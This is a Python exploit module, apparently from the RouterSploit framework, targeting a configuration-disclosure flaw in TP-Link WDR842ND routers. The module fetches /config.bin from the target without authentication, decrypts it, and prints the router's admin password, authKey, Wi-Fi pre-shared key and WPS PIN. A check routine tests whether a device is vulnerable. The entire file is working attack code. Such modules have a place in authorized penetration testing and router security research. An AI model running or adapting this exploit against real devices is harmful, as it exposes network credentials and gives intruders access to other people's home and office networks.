from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    http_request,
    mute,
    validators,
)
from routersploit.utils import read_tp_config


class Exploit(exploits.Exploit):
    """
    Exploit implementation for TP-Link WDR842ND configure disclosure vulnerability.
    If the target is vulnerable, it allows we fetch authKey,pskSecret,and .
    """
    __info__ = {
        'name': 'TP-Link WDR842ND configure Disclosure',
        'description': 'Module exploits TP-Link WDR842ND configure disclosure vulnerability which allows fetching configure.',
        'authors': [
            'qingdaoxiaoge <qdpp007[at]outlook.com>',  # vulnerability discovery
            'VegetableCat <yes-reply[at]linux.com>',  # routersploit module
        ],
        'references': [
            'http://cb.drops.wiki/bugs/wooyun-2015-0110062.html',
        ],
        'devices': [
            'TP-Link WDR842ND',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        url = "{}:{}/config.bin".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        if response.status_code == 200:
            print_success("Exploit success")
            print_status("Reading file config.bin")
            password , authKey , cPskSecret , cUsrPIN = read_tp_config.decrypt_config_bin(response.content)
            print_success("Found cPskSecret:"+cPskSecret)
            print_success("Found cUsrPIN:" + cUsrPIN)
            print_success("Found authKey:" + authKey)
            print_success("Password combination from top to bottom:" + '\n' + password)
        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")

    @mute
    def check(self):
        url = "{}:{}/config.bin".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200:
            return True  # target is vulnerable
        else:
            return False  # target is not vulnerable
